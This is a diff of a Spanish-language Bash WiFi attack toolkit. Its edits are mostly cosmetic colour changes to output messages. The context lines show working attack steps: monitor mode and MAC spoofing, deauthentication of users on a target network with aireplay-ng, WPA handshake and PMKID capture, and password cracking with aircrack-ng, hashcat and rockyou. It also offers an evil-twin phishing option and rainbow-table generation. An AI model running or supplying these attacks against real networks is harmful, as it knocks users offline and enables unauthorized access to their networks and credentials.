@@ -39,101 +39,101 @@ programs() {
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
-		echo -e "${turquoiseColour}[*] Actualizando los repositorios (update)..."; sudo apt-get update -y > /dev/null 2>&1
+		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios (update)..."; sudo apt-get update -y > /dev/null 2>&1
 		clear
 		test -f /usr/bin/macchanger
 		mactest=$(echo $?)
 		if [ $mactest -eq 0 ]; then
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 			sleep 0.5
-			echo -e "\n${greenColour}[+] macchanger listo"
+			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
 		else
-			echo -e "${blueColour}[*] Instalando macchanger..."
+			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
 			sudo apt-get install macchanger -y
 			clear
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 		fi
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
 			if [ "$(echo $?)" -eq 0 ]; then
-				echo -e "\n${greenColour}[+] $program listo"
+				echo -e "\n${greenColour}[+]$grayColour $program listo"
 				sleep 0.5
 			else 
-				echo -e "\n${redColour}[-] $program no instalado"
+				echo -e "\n${redColour}[-]$grayColour $program no instalado"
 				sleep 1
-				echo -e "\n${blueColour}[*] Instalando ${program}..." 
+				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
 				sudo apt-get install $program -y > /dev/null 2>&1
 
 			fi
 		done
 	elif [ "$arch" -eq 0 ]; then
 		clear; tput civis
-		echo -e "${turquoiseColour}[*] Actualizando los repositorios..."; sudo pacman -Syu -y > /dev/null 2>&1
+		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios..."; sudo pacman -Syu -y > /dev/null 2>&1
 		test -f /usr/bin/macchanger
 		mactest=$(echo $?)
 		if [ $mactest -eq 0 ]; then
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 			sleep 0.5
-			echo -e "\n${greenColour}[+] macchanger listo"
+			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
 		else
-			echo -e "${blueColour}[*] Instalando macchanger..."
+			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
 			sudo pacman -S macchanger -y
 			clear
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 		fi
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
 			if [ "$(echo $?)" -eq 0 ]; then
-				echo -e "\n${greenColour}[+] $program listo"
+				echo -e "\n${greenColour}[+]$grayColour $program listo"
 				sleep 0.5
 			else 
-				echo -e "\n${redColour}[-] $program no instalado"
+				echo -e "\n${redColour}[-]$grayColour $program no instalado"
 				sleep 1
-				echo -e "\n${blueColour}[*] Instalando ${program}..." 
+				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
 				sudo pacman -S $program -y > /dev/null 2>&1
 
 			fi
 		done
 	elif [ "$fedora" -eq 0 ]; then
 		clear; tput civis
-		echo -e "${turquoiseColour}[*] Actualizando los repositorios..."; sudo dnf update -y > /dev/null 2>&1
+		echo -e "${turquoiseColour}[*]$grayColour Actualizando los repositorios..."; sudo dnf update -y > /dev/null 2>&1
 		test -f /usr/bin/macchanger
 		mactest=$(echo $?)
 		if [ $mactest -eq 0 ]; then
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 			sleep 0.5
-			echo -e "\n${greenColour}[+] macchanger listo"
+			echo -e "\n${greenColour}[+]$grayColour macchanger listo"
 		else
-			echo -e "${blueColour}[*] Instalando macchanger..."
+			echo -e "${blueColour}[*]$grayColour Instalando macchanger..."
 			sudo dnf install macchanger -y
 			clear
-			echo -e "\n${grayColour}[*] Comprobando dependencias necesarias...\n"
+			echo -e "\n${blueColour}[*]$grayColour Comprobando dependencias necesarias...\n"
 		fi
 		
 		for program in "${dependencias[@]}"; do
 			test -f /usr/bin/$program
 			if [ "$(echo $?)" -eq 0 ]; then
-				echo -e "\n${greenColour}[+] $program listo"
+				echo -e "\n${greenColour}[+]$grayColour $program listo"
 				sleep 0.5
 			else 
-				echo -e "\n${redColour}[-] $program no instalado"
+				echo -e "\n${redColour}[-]$grayColour $program no instalado"
 				sleep 1
-				echo -e "\n${blueColour}[*] Instalando ${program}..." 
+				echo -e "\n${blueColour}[*]$grayColour Instalando ${program}..." 
 				sudo dnf install $program -y > /dev/null 2>&1
 
 			fi
 		done
 	else 
-		echo -e "\n${redColour}[!] No se puedo encontrar tu distribucion, descarga estos programas manualmente: aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd" 
+		echo -e "\n${redColour}[!]$grayColour No se puedo encontrar tu distribucion, descarga estos programas manualmente: aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd" 
 		sleep 5
 	fi
 }
 # 1) ataque
 handshake_ataque() {
 	clear
-	echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
+	echo -e "\n${turquoiseColour}[*]$grayColour Iniciando Ataque Handshake"
 	sleep 1
 	xterm -hold -e "airodump-ng $tar" &
 	airodump_xterm_PID=$!
@@ -143,7 +143,7 @@ handshake_ataque() {
 	read -p "[?] En que canal esta ${ap}?: " channel
 	tput civis
 	$cleancolor
-	echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
+	echo -e "${greenColour}[*]$grayColour Se esta desautenticando a los usuarios de la red"
 	$cleancolor
 	kill -9 $airodump_xterm_PID
 	wait $airodump_xterm_PID 2>/dev/null
@@ -155,7 +155,7 @@ handshake_ataque() {
 	aireplay_xterm_PID=$!
 	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-	echo -e "${redColour}\n[%] Esperando Handshake\n"
+	echo -e "${redColour}\n[%]$grayColour Esperando Handshake\n"
 	$cleancolor
 								
 	sleep 10; kill -9 $airodump_filter_xterm_PID
@@ -163,18 +163,18 @@ handshake_ataque() {
 	test -f Handshake-01.cap
 	if [ "$(echo $?)" == "0" ]; then
 		tput cnorm
-		echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+		echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
 		read -p "[?] Ruta del Diccionario al usar: " dicc
 		$cleancolor; tput civis
 		xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
 	else 
-		echo -e "${redColour}\n [!] No se ha capturado el Handshake"
+		echo -e "${redColour}\n[!]$grayColour No se ha capturado el Handshake"
 		sleep 2
 	fi
 }
 # salida
 salir() {
-	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
+	echo -e "\n${redColour}[*]$grayColour Saliendo y reiniciando la tarjeta de red...\n" 
 	tput civis
 	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
@@ -189,37 +189,37 @@ salir() {
 # 2) ataque
 pkmid_ataque() {
 	clear
-	echo -e "\n${greenColour}[*] Iniciando ataque PMKID..\n"
+	echo -e "\n${greenColour}[*]$grayColour Iniciando ataque PMKID..\n"
 	sleep 1 
-	echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
+	echo -e "${blueColour}[!]$grayColour Recomendacion: 600 segundos (10 minutos)"
 	read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
 	$cleancolor
 	xterm -hold -e "hcxdumptool -i $tar --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
-    echo -e "\n${redColour}[%] Capturando Hashes\n"
+    echo -e "\n${redColour}[%]$grayColour Capturando Hashes\n"
 	hcxcaptool -z HASHPMKID Captura; sudo rm Capruta 2>/dev/null
 	sleep 1
 	$cleancolor
 	test -f HASHPMKID*
 	if [ "$(echo $?)" -eq 0 ]; then
-		echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
+		echo -e "\n${yellowColour}[*]$grayColour Iniciando ataque de fuerza bruta"
 		sleep 1
 		tput cnorm
-		echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
+		echo -e "\n${blueColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 		read -p "[?] Ruta del Diccionario al usar: " dicc1
 		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
 		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
 	else 
-		echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
+		echo -e "\n${redColour}[!]$grayColour No se pudo capturar el paquete necesario"
 		sleep 2
 	fi
 }
 # 3) ataque
 fuerza_.cap() {
-	clear; echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
+	clear; echo -e "\n${greenColour}[*]$grayColour Iniciando Ataque de Fuerza Bruta"
 	sleep 1
-	echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+	echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
 	$cleancolor
 	tput cnorm
 	read -p "[?] Nombre del archivo .cap: " cap
@@ -234,7 +234,7 @@ fuerza_rainbow() {
 }
 
 rainbowtaibles() {
-	clear; echo -e "\n${yellowColour}[*] Iniciando..."
+	clear; echo -e "\n${yellowColour}[*]$grayColour Iniciando..."
 	read -p "[?] Ruta del diccionario: " ruta
 	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
 	test -f dicc-hasheado
@@ -247,15 +247,15 @@ rainbowtaibles() {
 		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
 		batch_PID=$!
 		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
-		echo -e "\n${greenColour}[+] Diccionario listo (Nombre: dicc-hasheado)"
+		echo -e "\n${greenColour}[+]$grayColour Diccionario listo (Nombre: dicc-hasheado)"
 		read -p "[?] Quieres hacer un ataque de fuerza bruta con el diccionario? [Y/N]: " attak
 		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
 			fuerza_rainbow
 		else
-			echo -e "\n${redColour}[!] Saliendo"
+			echo -e "\n${redColour}[!]$grayColour Saliendo"
 		fi
 	else
-		echo -e "\n${redColour}[!] No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
+		echo -e "\n${redColour}[!]$grayColour No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
 		sleep 2
 	fi
 }
@@ -277,17 +277,17 @@ menuforce() {
 	fuerza_rainbow
 	;;
 	4)
-	echo -e "\n[*] Saliendo..."
+	echo -e "\n${redColour}[*]$grayColour Saliendo..."
 	;;
 	*)
-	echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
+	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
 	sleep 2
 	;;
 	esac
 }
 
 scanner() {
-	clear; echo -e "\n${greenColour}[*] Iniciando Scanner de la red"
+	clear; echo -e "\n${greenColour}[*]$grayColour Iniciando Scanner de la red"
 	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
 	sudo /etc/init.d/networking restart > /dev/null 2>&1
@@ -314,10 +314,10 @@ menunomon() {
 	scanner
 	;;
 	3)
-	echo -e "\n[*] Saliendo..."
+	echo -e "\n${redColour}[*]$grayColour Saliendo..."
 	;;
 	*)
-	echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
+	echo -e "${redColour}\n[!]$grayColour Opcion invalida"
 	sleep 2
 	;;
 	esac
@@ -444,7 +444,8 @@ eviltrust() {
 }
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
-	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
+	echo -e "$redColour\n[!]$grayColour Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
+	$cleancolor
 	exit 1
 # Programa principal
 else
@@ -456,31 +457,29 @@ else
 	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  / "
 	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ / "
 	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/ "
-	echo -e "${purpleColour}"
-	echo "[+] Github: https://github.com/kidd3n"
-	echo "[-] Version no testeada (EvilTrust)"
-	read -p "[+] Enter para continuar"
+	echo "${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
+	echo "${redColour}[-]${grayColour} Version no testeada (EvilTrust)"
+	read -p "${greenColour}[+]$grayColour Enter para continuar"
 	$cleancolor
 	tput cnorm
-	echo -e "\n${grayColour}[*] El modo monitor es recomendable y necesario para algunos ataques"
+	echo -e "\n${redColour}[*]${endColour}${grayColour} El modo monitor es recomendable y necesario para algunos ataques"
 	sleep 1
-	read -p "[?] Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
+	echo -e "${purpleColour}[?]$grayColour"read -p " Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
 	$cleancolor
 		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
-			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
-			echo -e "\n"; read -p "[?] Que tarjeta deseas usar: " tar
+			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
+			echo -e "\n${redColour}[?]$grayColour"; read -p "[?] Que tarjeta deseas usar: " tar
 			$cleancolor
 			airmon-ng start $tar > /dev/null 2>&1
-			clear 
-			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
-			echo -e "\n"; read -p "[?] Confirmacion de la targeta (Poner el nombre tal como sale): " tar
-			tput civis; echo -e "\n${redColour}[*] Cambiando tu dirrecion MAC en $tar\n"
+			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
+			echo -e "${redColour}\n[?]$grayColour"; read -p " Confirmacion de la targeta (Poner el nombre tal como sale): " tar
+			tput civis; echo -e "\n${redColour}[*]${grayColour} Cambiando tu dirrecion MAC en $tar\n"
 			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
 			ifconfig $tar up
 			airmon-ng check kill > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
-			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
-			tput cnorm; read -p "[?] Quieres ir al menu ataques? [Y/N]: " rps
+			echo -e "\n${yellowColour}[*]${grayColour} Nueva direccion MAC asignada: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
+			echo -e "\n${greenColour}[*]${grayColour} Ya tienes tu tarjeta preparada!\n"
+			tput cnorm; echo -e "${blueColour}[?]$grayColour"; read -p " Quieres ir al menu ataques? [Y/N]: " rps
 			tput civis; $cleancolor
 			if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
 				while true; do
@@ -495,15 +494,15 @@ else
 				echo -e "    #"
 				echo -e "   #"
 				sleep 0.5
-				echo -e "${blueColour}\n[+] Targeta de Red: $tar" 
-				echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show $tar | grep "Current MAC" | awk '{print $3}')"
-				echo -e "${grayColour}\n[+] Hacking Wifi\t\t[+] Wifiphisher\t\t[+] Cracking password"
+				echo -e "${blueColour}\n[+]${grayColour} Targeta de Red: $tar" 
+				echo -e "${blueColour}[+]${grayColour} Direccion MAC: $(macchanger --show $tar | grep "Current MAC" | awk '{print $3}')"
+				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
 				echo -e "${yellowColour}\n1) Ataque Handshake\t\t4) EvilTrust (S4vitar)\t5) Fuerza bruta (.cap)"
 				echo -e "2) Ataque PMKID\t\t\t\t\t\t6) dicc-hasheado (Rainbow taibles)"
 				echo -e "3) Scanner de la red local"
-				echo -e "${redColour}\n7) Salir"
+				echo -e "\n7) Salir"
 				tput cnorm
-				echo -e "${greenColour}"; read -p "[?] Seleccione un ataque: " opcion
+				echo -e "${greenColour}[?]${grayColour}"; read -p "Seleccione un ataque: " opcion
 				$cleancolor
 				case $opcion in
 				1)
@@ -528,14 +527,14 @@ else
 				salir
 				;;
 				*)
-				echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
+				echo -e "${redColour}\n[!]$grayColour Opcion invalida"
 				sleep 2
 				;;
 				esac
 				done
 			fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
-				echo -e "${redColour}\n[!] Saliendo"
+				echo -e "${redColour}\n[!]$grayColour Saliendo"
 				$cleancolor
 				tput cnorm
 				exit
